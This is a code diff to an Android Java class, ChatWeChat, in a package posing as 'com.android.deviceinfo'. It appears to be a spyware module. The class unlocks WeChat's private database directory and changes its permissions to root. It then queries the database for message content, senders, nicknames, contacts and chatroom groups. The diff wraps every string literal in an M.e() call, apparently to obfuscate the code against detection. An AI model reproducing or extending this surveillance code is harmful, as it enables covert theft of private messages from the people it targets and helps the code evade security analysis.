@@ -18,6 +18,7 @@ import com.android.deviceinfo.manager.ManagerModule;
 import com.android.deviceinfo.module.ModuleAddressBook;
 import com.android.deviceinfo.util.Check;
 import com.android.deviceinfo.util.StringUtils;
+import com.android.m.M;
 
 public class ChatWeChat extends SubModuleChat {
 	private static final String TAG = "ChatWeChat";
@@ -103,11 +104,11 @@ public class ChatWeChat extends SubModuleChat {
 			lastLine = markup.unserialize(new Long(0));
 
 			// Get DB Dir
-			Path.unprotect("/data/data/com.tencent.mm/MicroMsg/");
+			Path.unprotect(M.e("/data/data/com.tencent.mm/MicroMsg/"));
 
 			// Not the cleanest solution, we should figure out how the hash is
 			// generated
-			File fList = new File("/data/data/com.tencent.mm/MicroMsg/");
+			File fList = new File(M.e("/data/data/com.tencent.mm/MicroMsg/"));
 			File[] files = fList.listFiles();
 
 			for (File f : files) {
@@ -128,7 +129,7 @@ public class ChatWeChat extends SubModuleChat {
 			}
 
 			// Lock encrypted DB
-			dbDir = "/data/data/com.tencent.mm/MicroMsg/" + dbDir + "/";
+			dbDir = M.e("/data/data/com.tencent.mm/MicroMsg/") + dbDir + "/";
 
 			// chmod 000, chown root:root
 			Path.lock(dbDir + dbEncFile);
@@ -188,7 +189,7 @@ public class ChatWeChat extends SubModuleChat {
 	private long fetchMessages(GenericSqliteHelper helper, final ChatGroups groups, long lastLine) {
 		final ArrayList<MessageChat> messages = new ArrayList<MessageChat>();
 
-		String sqlquery = "select m.createTime, m.talker, m.isSend, m.content, c.nickname from message as m join rcontact as c on m.talker=c.username where m.type = 1 and createTime > ? order by createTime";
+		String sqlquery = M.e("select m.createTime, m.talker, m.isSend, m.content, c.nickname from message as m join rcontact as c on m.talker=c.username where m.type = 1 and createTime > ? order by createTime");
 		RecordVisitor visitor = new RecordVisitor() {
 
 			@Override
@@ -209,7 +210,7 @@ public class ChatWeChat extends SubModuleChat {
 				}
 				String from_name, to;
 
-				if (talker.endsWith("@chatroom")) {
+				if (talker.endsWith(M.e("@chatroom"))) {
 					List<String> lines = Arrays.asList(content.split("\n"));
 					if (incoming) {
 
@@ -251,7 +252,7 @@ public class ChatWeChat extends SubModuleChat {
 	}
 
 	private void saveWechatContacts(GenericSqliteHelper helper) {
-		String[] projection = new String[] { "username", "nickname" };
+		String[] projection = new String[] { M.e("username"), M.e("nickname")};
 
 		boolean tosave = false;
 		RecordVisitor visitor = new RecordVisitor(projection, "nickname not null ") {
@@ -339,7 +340,7 @@ public class ChatWeChat extends SubModuleChat {
 			}
 		};
 
-		helper.traverseRecords("chatroom", visitor);
+		helper.traverseRecords(M.e("chatroom"), visitor);
 
 		return groups;
 	}
